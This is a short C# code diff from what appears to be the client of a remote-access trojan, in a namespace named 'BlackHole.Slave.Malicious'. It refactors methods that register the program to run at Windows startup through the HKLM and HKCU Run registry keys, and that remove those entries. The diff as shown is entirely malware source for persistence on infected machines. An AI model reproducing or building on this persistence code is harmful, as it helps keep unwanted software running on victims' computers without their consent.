@@ -28,10 +28,9 @@ namespace BlackHole.Slave.Malicious
 #endif
         }
 
-        private static string HKLMPath =>
-            (PlatformHelper.Is64Bit)
+        private static string HKLMPath => PlatformHelper.Is64Bit
                 ? "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
-                : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";        
+                : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 
         /// <summary>
         /// 
@@ -44,17 +43,11 @@ namespace BlackHole.Slave.Malicious
                 if (RegistryHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, HKLMPath,
                     MaliciousHelper.StartupKey, MaliciousHelper.ApplicationPath, true))
                     return true;
-                
-                return RegistryHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
+            }
+
+            return RegistryHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", MaliciousHelper.StartupKey, MaliciousHelper.ApplicationPath,
                     true);
-            }
-            else
-            {
-                return RegistryHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", MaliciousHelper.StartupKey, MaliciousHelper.ApplicationPath,
-                    true);
-            }
         }
 
         /// <summary>
@@ -68,15 +61,10 @@ namespace BlackHole.Slave.Malicious
                 if (RegistryHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, HKLMPath,
                     MaliciousHelper.StartupKey))
                     return true;
-                
-                return RegistryHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", MaliciousHelper.StartupKey);
             }
-            else
-            {
-                return RegistryHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", MaliciousHelper.StartupKey);
-            }
+
+            return RegistryHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
+                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", MaliciousHelper.StartupKey);
         }
     }
 }
